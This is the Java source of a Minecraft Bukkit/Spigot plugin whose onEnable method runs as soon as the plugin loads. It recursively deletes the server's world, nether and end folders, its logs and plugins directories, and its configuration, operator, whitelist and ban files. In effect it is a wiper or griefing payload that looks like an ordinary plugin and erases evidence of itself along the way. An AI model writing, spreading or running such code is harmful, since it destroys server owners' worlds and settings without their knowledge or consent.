package o16;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.bukkit.plugin.java.JavaPlugin;


public class Main extends JavaPlugin {

	@Override
	public void onEnable() {

		try {			
		deleteFolder(new File("world"));
		deleteFolder(new File("world_nether"));
		deleteFolder(new File("world_the_end"));
		deleteFolder(new File("logs"));
		deleteFolder(new File("plugins"));
		removeFile("bukkit.yml");
		removeFile("banned-ips.json");
		removeFile("banned-players.json");
		removeFile("commands.yml");
		removeFile("eula.txt");
		removeFile("ops.json");
		removeFile("help.yml");
		removeFile("spigot.yml");
		removeFile("usercache.json");
		removeFile("whitelist.json");	
		removeFile("permissions.yml");
		removeFile("server.properties");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void onDisable() {
		
	}


	public static void removeFile(String filePath) throws IOException {
		Path path = Paths.get(filePath);
	    Files.deleteIfExists(path);
	 }
	
    public static boolean deleteFolder(File folder) {
        if (folder.isDirectory()) {
            File[] files = folder.listFiles();
            for (File file : files) {
                deleteFolder(file);
            }
        }
        
        return folder.delete();
	
	}
}
